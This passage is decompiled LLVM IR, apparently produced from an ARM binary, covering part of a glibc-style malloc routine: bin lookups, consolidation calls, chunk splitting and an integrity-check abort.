  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_127c4 = load i32, i32* @r4, align 4
  %v6_127c4 = load i32, i32* @r5, align 4
  %v9_127c4 = load i32, i32* @r6, align 4
  %v12_127c4 = load i32, i32* @r7, align 4
  %v15_127c4 = load i32, i32* @r8, align 4
  %v18_127c4 = load i32, i32* @sb, align 4
  %v21_127c4 = load i32, i32* @sl, align 4
  %v24_127c4 = load i32, i32* @fp, align 4
  %v27_127c4 = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r1.global-to-local, align 4
  %v4_127d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 72) to i32*), align 4
  store i32 %v4_127d8, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_127e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 36) to i32*), align 4
  store i32 %v4_127e4, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_127d8, i32* %r2.global-to-local, align 4
  %v2_127f0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_127f0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %ip.global-to-local, align 4
  %v4_127fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  store i32 %v4_127fc, i32* %ip.global-to-local, align 4
  store i32 75784, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_127fc)
  %v0_12808 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12808, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r1.global-to-local, align 4
  %v4_12814 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 16) to i32*), align 4
  store i32 %v4_12814, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_12820.722 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12814)
  %v0_12820 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_12820, -32
  br i1 %tmp, label %dec_label_pc_1283c, label %dec_label_pc_12828

dec_label_pc_12828:                               ; preds = %entry
  %v0_12828 = call i32 @__GI___errno_location()
  store i32 %v0_12828, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_12834 = inttoptr i32 %v0_12828 to i32*
  store i32 12, i32* %v2_12834, align 4
  br label %dec_label_pc_130b8

dec_label_pc_1283c:                               ; preds = %entry
  %v1_1283c = add i32 %v0_12820, 11
  store i32 %v1_1283c, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  %v2_12848 = icmp ugt i32 %v1_1283c, 14
  %v7_12848 = icmp eq i32 %v1_1283c, 15
  %v2_1284c = xor i1 %v7_12848, true
  %v3_1284c = and i1 %v2_12848, %v2_1284c
  br i1 %v3_1284c, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_1283c
  %v5_1284c = and i32 %v1_1283c, -8
  store i32 %v5_1284c, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_1283c, %bb
  %v4_12850 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12850, i32* @r0, align 4
  %v1_12854 = inttoptr i32 %v4_12850 to i32*
  %v2_12854 = load i32, i32* %v1_12854, align 4
  store i32 %v2_12854, i32* @r4, align 4
  %v2_12858 = xor i1 %v2_12848, true
  %v3_12858 = or i1 %v7_12848, %v2_12858
  br i1 %v3_12858, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_1285c = urem i32 %v2_12854, 2
  %v2_1285c = icmp eq i32 %v1_1285c, 0
  br i1 %v2_1285c, label %dec_label_pc_12864, label %dec_label_pc_12874

dec_label_pc_12864:                               ; preds = %bb140
  %v2_12864 = icmp eq i32 %v2_12854, 0
  br i1 %v2_12864, label %dec_label_pc_1286c, label %dec_label_pc_12c50

dec_label_pc_1286c:                               ; preds = %dec_label_pc_12864
  %v0_1286c = call i32 @__malloc_consolidate()
  store i32 %v0_1286c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c50

dec_label_pc_12874:                               ; preds = %bb140
  %v0_12874 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_12874, %v2_12854
  br i1 %tmp201, label %dec_label_pc_1289c, label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12874
  %v1_1287c = add i32 %v4_12850, -4
  store i32 %v1_1287c, i32* %r1.global-to-local, align 4
  %v3_12880 = udiv i32 %v0_12874, 8
  store i32 %v3_12880, i32* %r2.global-to-local, align 4
  %v4_12884 = mul nuw i32 %v3_12880, 4
  %v5_12884 = add i32 %v4_12884, %v1_1287c
  %v6_12884 = inttoptr i32 %v5_12884 to i32*
  %v7_12884 = load i32, i32* %v6_12884, align 4
  store i32 %v7_12884, i32* %r0.global-to-local, align 4
  %v2_12888 = icmp eq i32 %v7_12884, 0
  br i1 %v2_12888, label %dec_label_pc_1289c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1287c
  %v2_1288c = add i32 %v7_12884, 8
  %v3_1288c = inttoptr i32 %v2_1288c to i32*
  %v4_1288c = load i32, i32* %v3_1288c, align 4
  store i32 %v4_1288c, i32* %r3.global-to-local, align 4
  store i32 %v2_1288c, i32* %r0.global-to-local, align 4
  store i32 %v2_1288c, i32* %r4.global-to-local, align 4
  store i32 %v4_1288c, i32* %v6_12884, align 4
  br label %dec_label_pc_1309c

dec_label_pc_1289c:                               ; preds = %dec_label_pc_1287c, %dec_label_pc_12874
  %tmp202 = icmp ugt i32 %v0_12874, 255
  br i1 %tmp202, label %dec_label_pc_128ec, label %dec_label_pc_128a4

dec_label_pc_128a4:                               ; preds = %dec_label_pc_1289c
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_128ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  %v3_128b0 = udiv i32 %v0_12874, 8
  store i32 %v3_128b0, i32* @r7, align 4
  %v4_128b4 = mul nuw i32 %v3_128b0, 8
  %v5_128b4 = add i32 %v4_128ac, %v4_128b4
  store i32 %v5_128b4, i32* %r3.global-to-local, align 4
  %v1_128b8 = add i32 %v5_128b4, 44
  store i32 %v1_128b8, i32* %ip.global-to-local, align 4
  %v1_128bc = add i32 %v5_128b4, 56
  %v2_128bc = inttoptr i32 %v1_128bc to i32*
  %v3_128bc = load i32, i32* %v2_128bc, align 4
  store i32 %v3_128bc, i32* %r0.global-to-local, align 4
  %v9_128c0 = icmp eq i32 %v3_128bc, %v1_128b8
  br i1 %v9_128c0, label %dec_label_pc_12a4c, label %dec_label_pc_128c8

dec_label_pc_128c8:                               ; preds = %dec_label_pc_128a4
  %v2_128c8 = add i32 %v3_128bc, %v0_12874
  store i32 %v2_128c8, i32* %r3.global-to-local, align 4
  %v1_128cc = add i32 %v2_128c8, 4
  %v2_128cc = inttoptr i32 %v1_128cc to i32*
  %v3_128cc = load i32, i32* %v2_128cc, align 4
  store i32 %v3_128cc, i32* %r2.global-to-local, align 4
  %v1_128d0 = add i32 %v3_128bc, 12
  %v2_128d0 = inttoptr i32 %v1_128d0 to i32*
  %v3_128d0 = load i32, i32* %v2_128d0, align 4
  store i32 %v3_128d0, i32* %r1.global-to-local, align 4
  %v1_128d4 = or i32 %v3_128cc, 1
  store i32 %v1_128d4, i32* %r2.global-to-local, align 4
  %v1_128d8 = add i32 %v3_128bc, 8
  store i32 %v1_128d8, i32* %r4.global-to-local, align 4
  store i32 %v1_128d4, i32* %v2_128cc, align 4
  %v0_128e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_128e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_128e0 = add i32 %v1_128e0, 8
  %v3_128e0 = inttoptr i32 %v2_128e0 to i32*
  store i32 %v0_128e0, i32* %v3_128e0, align 4
  %v0_128e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_128e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_128e4 = add i32 %v1_128e4, 12
  %v3_128e4 = inttoptr i32 %v2_128e4 to i32*
  store i32 %v0_128e4, i32* %v3_128e4, align 4
  br label %dec_label_pc_1309c

dec_label_pc_128ec:                               ; preds = %dec_label_pc_1289c
  store i32 %v0_12874, i32* %r0.global-to-local, align 4
  %v1_128f0 = call i32 @__malloc_largebin_index(i32 %v0_12874)
  store i32 %v1_128f0, i32* %r0.global-to-local, align 4
  %v0_128f4 = load i32, i32* @r4, align 4
  %v1_128f4 = and i32 %v0_128f4, 2
  %v2_128f4 = icmp eq i32 %v1_128f4, 0
  store i32 %v1_128f0, i32* @r7, align 4
  br i1 %v2_128f4, label %dec_label_pc_12a4c, label %dec_label_pc_12900

dec_label_pc_12900:                               ; preds = %dec_label_pc_128ec
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r1.global-to-local, align 4
  %v4_12908 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12908, i32* @r0, align 4
  %v0_1290c = call i32 @__malloc_consolidate()
  store i32 %v0_1290c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a4c

dec_label_pc_12914:                               ; preds = %dec_label_pc_12a60
  %v1_12914 = add i32 %v3_12a60, 4
  %v2_12914 = inttoptr i32 %v1_12914 to i32*
  %v3_12914 = load i32, i32* %v2_12914, align 4
  store i32 %v3_12914, i32* %r3.global-to-local, align 4
  %v0_12918 = load i32, i32* @sl, align 4
  %v1_1291c = and i32 %v3_12914, -4
  store i32 %v1_1291c, i32* %r4.global-to-local, align 4
  %v1_12920 = add i32 %v3_12a60, 12
  %v2_12920 = inttoptr i32 %v1_12920 to i32*
  %v3_12920 = load i32, i32* %v2_12920, align 4
  store i32 %v3_12920, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_12918, 255
  br i1 %tmp203, label %dec_label_pc_1297c, label %dec_label_pc_12928

dec_label_pc_12928:                               ; preds = %dec_label_pc_12914
  %v9_12928 = icmp eq i32 %v3_12920, %v0_12980
  br i1 %v9_12928, label %dec_label_pc_12930, label %dec_label_pc_1297c

dec_label_pc_12930:                               ; preds = %dec_label_pc_12928
  %v0_12930 = load i32, i32* @sb, align 4
  %v1_12930 = add i32 %v0_12930, 48
  %v2_12930 = inttoptr i32 %v1_12930 to i32*
  %v3_12930 = load i32, i32* %v2_12930, align 4
  store i32 %v3_12930, i32* %r3.global-to-local, align 4
  %v9_12934 = icmp eq i32 %v3_12a60, %v3_12930
  br i1 %v9_12934, label %dec_label_pc_1293c, label %dec_label_pc_1297c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12930
  %v1_1293c = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_1291c, %v1_1293c
  br i1 %tmp204, label %dec_label_pc_12944, label %dec_label_pc_1297c

dec_label_pc_12944:                               ; preds = %dec_label_pc_1293c
  %v2_12944 = sub i32 %v1_1291c, %v0_12918
  store i32 %v2_12944, i32* %r2.global-to-local, align 4
  %v2_12948 = add i32 %v0_12918, %v3_12a60
  store i32 %v2_12948, i32* %r3.global-to-local, align 4
  %v1_1294c = or i32 %v0_12918, 1
  store i32 %v1_1294c, i32* %r0.global-to-local, align 4
  %v1_12950 = or i32 %v2_12944, 1
  store i32 %v1_12950, i32* %r1.global-to-local, align 4
  %v1_12954 = add i32 %v3_12a60, 8
  store i32 %v1_12954, i32* %r4.global-to-local, align 4
  %v2_12958 = add i32 %v0_12980, 8
  %v3_12958 = inttoptr i32 %v2_12958 to i32*
  store i32 %v2_12948, i32* %v3_12958, align 4
  %v0_1295c = load i32, i32* %r3.global-to-local, align 4
  %v1_1295c = load i32, i32* %ip.global-to-local, align 4
  %v2_1295c = add i32 %v1_1295c, 12
  %v3_1295c = inttoptr i32 %v2_1295c to i32*
  store i32 %v0_1295c, i32* %v3_1295c, align 4
  %v0_12960 = load i32, i32* %r0.global-to-local, align 4
  %v1_12960 = load i32, i32* @r6, align 4
  %v2_12960 = add i32 %v1_12960, 4
  %v3_12960 = inttoptr i32 %v2_12960 to i32*
  store i32 %v0_12960, i32* %v3_12960, align 4
  %v0_12964 = load i32, i32* %r3.global-to-local, align 4
  %v1_12964 = load i32, i32* @sb, align 4
  %v2_12964 = add i32 %v1_12964, 48
  %v3_12964 = inttoptr i32 %v2_12964 to i32*
  store i32 %v0_12964, i32* %v3_12964, align 4
  %v0_12968 = load i32, i32* %r2.global-to-local, align 4
  %v1_12968 = load i32, i32* %r3.global-to-local, align 4
  %v3_12968 = add i32 %v1_12968, %v0_12968
  %v4_12968 = inttoptr i32 %v3_12968 to i32*
  store i32 %v0_12968, i32* %v4_12968, align 4
  %v0_1296c = load i32, i32* %r1.global-to-local, align 4
  %v1_1296c = load i32, i32* %r3.global-to-local, align 4
  %v2_1296c = add i32 %v1_1296c, 4
  %v3_1296c = inttoptr i32 %v2_1296c to i32*
  store i32 %v0_1296c, i32* %v3_1296c, align 4
  %v0_12970 = load i32, i32* %ip.global-to-local, align 4
  %v1_12970 = load i32, i32* %r3.global-to-local, align 4
  %v2_12970 = add i32 %v1_12970, 12
  %v3_12970 = inttoptr i32 %v2_12970 to i32*
  store i32 %v0_12970, i32* %v3_12970, align 4
  %v0_12974 = load i32, i32* %ip.global-to-local, align 4
  %v1_12974 = load i32, i32* %r3.global-to-local, align 4
  %v2_12974 = add i32 %v1_12974, 8
  %v3_12974 = inttoptr i32 %v2_12974 to i32*
  store i32 %v0_12974, i32* %v3_12974, align 4
  br label %dec_label_pc_1309c

dec_label_pc_1297c:                               ; preds = %dec_label_pc_1293c, %dec_label_pc_12930, %dec_label_pc_12928, %dec_label_pc_12914
  %v9_1297c = icmp eq i32 %v1_1291c, %v0_12918
  %v2_12980 = add i32 %v3_12920, 8
  %v3_12980 = inttoptr i32 %v2_12980 to i32*
  store i32 %v0_12980, i32* %v3_12980, align 4
  %v0_12984 = load i32, i32* %ip.global-to-local, align 4
  %v1_12984 = load i32, i32* %r5.global-to-local, align 4
  %v2_12984 = add i32 %v1_12984, 12
  %v3_12984 = inttoptr i32 %v2_12984 to i32*
  store i32 %v0_12984, i32* %v3_12984, align 4
  br i1 %v9_1297c, label %dec_label_pc_12adc.loopexit, label %dec_label_pc_12998

dec_label_pc_12998:                               ; preds = %dec_label_pc_1297c
  %v0_12998 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_12998, 255
  br i1 %tmp205, label %dec_label_pc_129bc, label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_12998
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  %v1_129a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_129a4 = add i32 %v1_129a4, ptrtoint (i32* @global_var_268d4.582 to i32)
  %v3_129a4 = inttoptr i32 %v2_129a4 to i32*
  %v4_129a4 = load i32, i32* %v3_129a4, align 4
  %v3_129a8 = udiv i32 %v0_12998, 8
  store i32 %v3_129a8, i32* %r0.global-to-local, align 4
  %v4_129ac = mul nuw i32 %v3_129a8, 8
  %v5_129ac = add i32 %v4_129a4, %v4_129ac
  store i32 %v5_129ac, i32* %r3.global-to-local, align 4
  %v1_129b0 = add i32 %v5_129ac, 44
  store i32 %v1_129b0, i32* %ip.global-to-local, align 4
  %v1_129b4 = add i32 %v5_129ac, 52
  %v2_129b4 = inttoptr i32 %v1_129b4 to i32*
  %v3_129b4 = load i32, i32* %v2_129b4, align 4
  store i32 %v3_129b4, i32* @lr, align 4
  br label %dec_label_pc_12a14

dec_label_pc_129bc:                               ; preds = %dec_label_pc_12998
  store i32 %v0_12998, i32* %r0.global-to-local, align 4
  %v1_129c0 = call i32 @__malloc_largebin_index(i32 %v0_12998)
  store i32 %v1_129c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %ip.global-to-local, align 4
  %v1_129c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_129c8 = add i32 %v1_129c8, ptrtoint (i32* @global_var_268d4.582 to i32)
  %v3_129c8 = inttoptr i32 %v2_129c8 to i32*
  %v4_129c8 = load i32, i32* %v3_129c8, align 4
  %v4_129cc = mul i32 %v1_129c0, 8
  %v5_129cc = add i32 %v4_129c8, %v4_129cc
  store i32 %v5_129cc, i32* %r3.global-to-local, align 4
  %v1_129d0 = add i32 %v5_129cc, 44
  store i32 %v1_129d0, i32* %ip.global-to-local, align 4
  %v1_129d4 = add i32 %v5_129cc, 52
  %v2_129d4 = inttoptr i32 %v1_129d4 to i32*
  %v3_129d4 = load i32, i32* %v2_129d4, align 4
  store i32 %v3_129d4, i32* @lr, align 4
  %v9_129d8 = icmp eq i32 %v3_129d4, %v1_129d0
  br i1 %v9_129d8, label %dec_label_pc_12a14, label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129bc
  %v1_129e0 = add i32 %v5_129cc, 56
  %v2_129e0 = inttoptr i32 %v1_129e0 to i32*
  %v3_129e0 = load i32, i32* %v2_129e0, align 4
  store i32 %v3_129e0, i32* %r1.global-to-local, align 4
  %v1_129e4 = add i32 %v3_129e0, 4
  %v2_129e4 = inttoptr i32 %v1_129e4 to i32*
  %v3_129e4 = load i32, i32* %v2_129e4, align 4
  store i32 %v3_129e4, i32* %r3.global-to-local, align 4
  %v0_129e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_129e8 = icmp ult i32 %v0_129e8, %v3_129e4
  br i1 %v3_129e8, label %.thread, label %dec_label_pc_12a04.preheader

.thread:                                          ; preds = %dec_label_pc_129e0
  store i32 %v1_129d0, i32* @lr, align 4
  store i32 %v3_129e0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12a14

dec_label_pc_12a04.preheader:                     ; preds = %dec_label_pc_129e0
  %v2_129f0 = or i32 %v0_129e8, 1
  store i32 %v2_129f0, i32* %r2.global-to-local, align 4
  %v1_12a04179 = add i32 %v3_129d4, 4
  %v2_12a04180 = inttoptr i32 %v1_12a04179 to i32*
  %v3_12a04181 = load i32, i32* %v2_12a04180, align 4
  store i32 %v3_12a04181, i32* %r3.global-to-local, align 4
  %v3_12a08183 = icmp ult i32 %v2_129f0, %v3_12a04181
  br i1 %v3_12a08183, label %dec_label_pc_12a00, label %dec_label_pc_12a10

dec_label_pc_12a00:                               ; preds = %dec_label_pc_12a04.preheader, %dec_label_pc_12a00
  %v0_12a10184 = phi i32 [ %v3_12a00, %dec_label_pc_12a00 ], [ %v3_129d4, %dec_label_pc_12a04.preheader ]
  %v1_12a00 = add i32 %v0_12a10184, 8
  %v2_12a00 = inttoptr i32 %v1_12a00 to i32*
  %v3_12a00 = load i32, i32* %v2_12a00, align 4
  store i32 %v3_12a00, i32* @lr, align 4
  %v1_12a04 = add i32 %v3_12a00, 4
  %v2_12a04 = inttoptr i32 %v1_12a04 to i32*
  %v3_12a04 = load i32, i32* %v2_12a04, align 4
  store i32 %v3_12a04, i32* %r3.global-to-local, align 4
  %v3_12a08 = icmp ult i32 %v2_129f0, %v3_12a04
  br i1 %v3_12a08, label %dec_label_pc_12a00, label %dec_label_pc_12a10

dec_label_pc_12a10:                               ; preds = %dec_label_pc_12a00, %dec_label_pc_12a04.preheader
  %v0_12a10.lcssa = phi i32 [ %v3_129d4, %dec_label_pc_12a04.preheader ], [ %v3_12a00, %dec_label_pc_12a00 ]
  %v1_12a10 = add i32 %v0_12a10.lcssa, 12
  %v2_12a10 = inttoptr i32 %v1_12a10 to i32*
  %v3_12a10 = load i32, i32* %v2_12a10, align 4
  store i32 %v3_12a10, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12a14

dec_label_pc_12a14:                               ; preds = %.thread, %dec_label_pc_129bc, %dec_label_pc_129a0, %dec_label_pc_12a10
  %v0_12a34 = phi i32 [ %v1_129d0, %dec_label_pc_129bc ], [ %v1_129b0, %dec_label_pc_129a0 ], [ %v3_12a10, %dec_label_pc_12a10 ], [ %v3_129e0, %.thread ]
  %v0_12a28 = phi i32 [ %v1_129c0, %dec_label_pc_129bc ], [ %v3_129a8, %dec_label_pc_129a0 ], [ %v1_129c0, %dec_label_pc_12a10 ], [ %v1_129c0, %.thread ]
  %v1_12a18 = phi i32 [ %v1_129c8, %dec_label_pc_129bc ], [ %v1_129a4, %dec_label_pc_129a0 ], [ %v1_129c8, %dec_label_pc_12a10 ], [ %v1_129c8, %.thread ]
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  %v2_12a18 = add i32 %v1_12a18, ptrtoint (i32* @global_var_268d4.582 to i32)
  %v3_12a18 = inttoptr i32 %v2_12a18 to i32*
  %v4_12a18 = load i32, i32* %v3_12a18, align 4
  %v3_12a1c = sdiv i32 %v0_12a28, 32
  store i32 %v3_12a1c, i32* %r3.global-to-local, align 4
  %v4_12a20 = mul nsw i32 %v3_12a1c, 4
  %v5_12a20 = add i32 %v4_12a18, %v4_12a20
  store i32 %v5_12a20, i32* %r1.global-to-local, align 4
  %v1_12a24 = add i32 %v5_12a20, 820
  %v2_12a24 = inttoptr i32 %v1_12a24 to i32*
  %v3_12a24 = load i32, i32* %v2_12a24, align 4
  %v1_12a28 = urem i32 %v0_12a28, 32
  store i32 %v1_12a28, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_12a30 = shl i32 1, %v1_12a28
  %v8_12a30 = or i32 %v3_12a24, %v7_12a30
  store i32 %v8_12a30, i32* %r3.global-to-local, align 4
  %v1_12a34 = load i32, i32* @r6, align 4
  %v2_12a34 = add i32 %v1_12a34, 12
  %v3_12a34 = inttoptr i32 %v2_12a34 to i32*
  store i32 %v0_12a34, i32* %v3_12a34, align 4
  %v0_12a38 = load i32, i32* @lr, align 4
  %v1_12a38 = load i32, i32* @r6, align 4
  %v2_12a38 = add i32 %v1_12a38, 8
  %v3_12a38 = inttoptr i32 %v2_12a38 to i32*
  store i32 %v0_12a38, i32* %v3_12a38, align 4
  %v0_12a3c = load i32, i32* %r3.global-to-local, align 4
  %v1_12a3c = load i32, i32* %r1.global-to-local, align 4
  %v2_12a3c = add i32 %v1_12a3c, 820
  %v3_12a3c = inttoptr i32 %v2_12a3c to i32*
  store i32 %v0_12a3c, i32* %v3_12a3c, align 4
  %v0_12a40 = load i32, i32* @r6, align 4
  %v1_12a40 = load i32, i32* @lr, align 4
  %v2_12a40 = add i32 %v1_12a40, 12
  %v3_12a40 = inttoptr i32 %v2_12a40 to i32*
  store i32 %v0_12a40, i32* %v3_12a40, align 4
  %v0_12a44 = load i32, i32* @r6, align 4
  %v1_12a44 = load i32, i32* %ip.global-to-local, align 4
  %v2_12a44 = add i32 %v1_12a44, 8
  %v3_12a44 = inttoptr i32 %v2_12a44 to i32*
  store i32 %v0_12a44, i32* %v3_12a44, align 4
  %v0_12a60.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12a60

dec_label_pc_12a4c:                               ; preds = %dec_label_pc_128ec, %dec_label_pc_128a4, %dec_label_pc_12900
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r1.global-to-local, align 4
  %v4_12a54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12a54, i32* @sb, align 4
  %v0_12a58 = load i32, i32* @sl, align 4
  %v1_12a58 = add i32 %v0_12a58, 16
  store i32 %v1_12a58, i32* @fp, align 4
  %v1_12a5c = add i32 %v4_12a54, 52
  store i32 %v1_12a5c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12a60

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a14, %dec_label_pc_12a4c
  %v0_12980 = phi i32 [ %v0_12a60.pre, %dec_label_pc_12a14 ], [ %v1_12a5c, %dec_label_pc_12a4c ]
  %v1_12a60 = add i32 %v0_12980, 12
  %v2_12a60 = inttoptr i32 %v1_12a60 to i32*
  %v3_12a60 = load i32, i32* %v2_12a60, align 4
  store i32 %v3_12a60, i32* @r6, align 4
  %v9_12a64 = icmp eq i32 %v3_12a60, %v0_12980
  br i1 %v9_12a64, label %dec_label_pc_12a6c, label %dec_label_pc_12914

dec_label_pc_12a6c:                               ; preds = %dec_label_pc_12a60
  %v0_12a6c = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_12a6c, 256
  %v0_12b24.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_12a6c.dec_label_pc_12b24_crit_edge, label %dec_label_pc_12a74

dec_label_pc_12a6c.dec_label_pc_12b24_crit_edge:  ; preds = %dec_label_pc_12a6c
  %.pre200 = mul i32 %v0_12b24.pre, 8
  br label %dec_label_pc_12b24

dec_label_pc_12a74:                               ; preds = %dec_label_pc_12a6c
  %v4_12a74 = mul i32 %v0_12b24.pre, 8
  %v5_12a74 = add i32 %v4_12a74, %v0_12980
  store i32 %v5_12a74, i32* %r3.global-to-local, align 4
  %v1_12a78 = add i32 %v5_12a74, -8
  store i32 %v1_12a78, i32* %r1.global-to-local, align 4
  %v1_12a7c = add i32 %v5_12a74, 4
  %v2_12a7c = inttoptr i32 %v1_12a7c to i32*
  %storemerge.pre = load i32, i32* %v2_12a7c, align 4
  br label %dec_label_pc_12b1c

dec_label_pc_12a84:                               ; preds = %dec_label_pc_12b1c
  %v1_12a84 = add i32 %v1_12aac, 4
  %v2_12a84 = inttoptr i32 %v1_12a84 to i32*
  %v3_12a84 = load i32, i32* %v2_12a84, align 4
  store i32 %v3_12a84, i32* %r3.global-to-local, align 4
  %v1_12a88 = and i32 %v3_12a84, -4
  store i32 %v1_12a88, i32* %r2.global-to-local, align 4
  %v3_12a8c = icmp ult i32 %v1_12a88, %v0_12a6c
  %v1_12a90 = add i32 %v1_12aac, 12
  %v2_12a90 = inttoptr i32 %v1_12a90 to i32*
  %v3_12a90 = load i32, i32* %v2_12a90, align 4
  store i32 %v3_12a90, i32* %r0.global-to-local, align 4
  br i1 %v3_12a8c, label %dec_label_pc_12b1c, label %dec_label_pc_12a98

dec_label_pc_12a98:                               ; preds = %dec_label_pc_12a84
  %v1_12a98 = add i32 %v1_12aac, 8
  %v2_12a98 = inttoptr i32 %v1_12a98 to i32*
  %v3_12a98 = load i32, i32* %v2_12a98, align 4
  store i32 %v3_12a98, i32* %r1.global-to-local, align 4
  %v1_12a9c = add i32 %v3_12a98, 12
  %v2_12a9c = inttoptr i32 %v1_12a9c to i32*
  %v3_12a9c = load i32, i32* %v2_12a9c, align 4
  store i32 %v3_12a9c, i32* %r3.global-to-local, align 4
  %v9_12aa0 = icmp eq i32 %v3_12a9c, %v1_12aac
  br i1 %v9_12aa0, label %dec_label_pc_12aa8, label %dec_label_pc_12ab4

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12a98
  %v1_12aa8 = add i32 %v3_12a90, 8
  %v2_12aa8 = inttoptr i32 %v1_12aa8 to i32*
  %v3_12aa8 = load i32, i32* %v2_12aa8, align 4
  store i32 %v3_12aa8, i32* %r3.global-to-local, align 4
  %v9_12aac = icmp eq i32 %v3_12aa8, %v1_12aac
  br i1 %v9_12aac, label %dec_label_pc_12ab8, label %dec_label_pc_12ab4

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12a98, %dec_label_pc_12aa8
  %v0_12ab4 = call i32 @abort()
  store i32 %v0_12ab4, i32* %r0.global-to-local, align 4
  %v0_12ab8.pre = load i32, i32* @sl, align 4
  %v1_12ab8.pre = load i32, i32* @r2, align 4
  %v0_12ac0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12ab8

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12aa8, %dec_label_pc_12ab4
  %v1_12ac0 = phi i32 [ %v3_12a90, %dec_label_pc_12aa8 ], [ %v0_12ab4, %dec_label_pc_12ab4 ]
  %v0_12ac0 = phi i32 [ %v3_12a98, %dec_label_pc_12aa8 ], [ %v0_12ac0.pre, %dec_label_pc_12ab4 ]
  %v1_12ab8 = phi i32 [ %v1_12a88, %dec_label_pc_12aa8 ], [ %v1_12ab8.pre, %dec_label_pc_12ab4 ]
  %v0_12ab8 = phi i32 [ %v0_12a6c, %dec_label_pc_12aa8 ], [ %v0_12ab8.pre, %dec_label_pc_12ab4 ]
  %v2_12ab8 = sub i32 %v1_12ab8, %v0_12ab8
  store i32 %v2_12ab8, i32* %lr.global-to-local, align 4
  %v2_12ac0 = add i32 %v1_12ac0, 8
  %v3_12ac0 = inttoptr i32 %v2_12ac0 to i32*
  store i32 %v0_12ac0, i32* %v3_12ac0, align 4
  %v0_12ac4 = load i32, i32* %r0.global-to-local, align 4
  %v1_12ac4 = load i32, i32* %r1.global-to-local, align 4
